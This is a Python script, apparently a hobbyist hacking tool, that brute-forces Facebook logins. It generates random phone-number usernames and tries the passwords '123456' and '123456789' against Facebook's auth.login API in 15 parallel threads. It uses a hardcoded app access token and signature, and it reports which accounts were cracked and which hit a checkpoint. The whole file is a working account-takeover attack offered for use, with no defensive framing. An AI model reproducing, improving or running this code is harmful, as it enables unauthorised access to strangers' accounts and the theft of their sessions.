#!/usr/bin/python3
#-*-coding:utf-8-*-
# Made With ❤️ uj

import requests,subprocess,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json,ipaddress,mechanize
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from urllib.parse import quote
br = mechanize.Browser()

##colours
p = "\x1b[0;97m" # White
m = "\x1b[0;91m" # Red
h = "\x1b[0;92m" # Green
k = "\x1b[0;93m" # Yellow
b = "\x1b[0;94m" # Blue
u = "\x1b[0;95m" # Purple
o = "\x1b[0;96m" # Light Blue
N = "\033[0m" # Off Color


##logo
_logo_line_1_ = ('\x1b[1;91m___   ___ ___ ___ _______ _______')
_logo_line_2_ = ('\x1b[1;91m| |   | | | | | | |  ___| |_   _|')
_logo_line_3_ = ('\x1b[1;92m| |___| | | | | | | |___    | |  ')
_logo_line_4_ = ('\x1b[1;92m|  ___  | | | | | |___  |   | |  ')
_logo_line_5_ = ('\x1b[1;91m| |   | | | |_| | ____| |  _| |  ')
_logo_line_6_ = ('\x1b[1;91m|_|   |_| |_____| |_____| |___|  ')
_logo_line_7_ = ('\x1b[1;97m-------------------------------------------------')
def _my_logo_():
    print(_logo_line_1_)
    print(_logo_line_2_)
    print(_logo_line_3_)
    print(_logo_line_4_)
    print(_logo_line_5_)
    print(_logo_line_6_)
    print(_logo_line_7_+'\n')



def random_numbers():
  _my_logo_()
  passs1=("123456")
  passs2=("123456789")
  data = []
  kode=str(10000000)
  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 8 Digit")) if len(kode) < 8 else ''
  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 8 Digit")) if len(kode) > 8 else ''
  jml=int(input(k+"["+p+"•"+k+"]"+p+" Amount : "))
  [data.append({'user': str(e), 'pw':[str(passs1), str(passs2)]}) for e in [str(kode)+''.join(['%s'%(random.randint(0000000,9999999))]) for e in range(jml)]]
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(k+"\n[ "+p+"Back"+k+" ]"+p)
  exit()

def brute(user, passs):
    for pw in passs:
      cracking=br.open("https://b-api.facebook.com/method/auth.login?access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
###https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=" + titid[0] + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm
####https://b-api.facebook.com/method/auth.login?access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email=user&locale=en_US&password=pass&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6
      if re.search('(EAAA)\w+', str(cracking.text)):
        print('\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in cracking.json()['error_msg']:
        print('\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s '%(str(user), str(pw)))
        break
  

if __name__=='__main__':
    random_numbers()
  
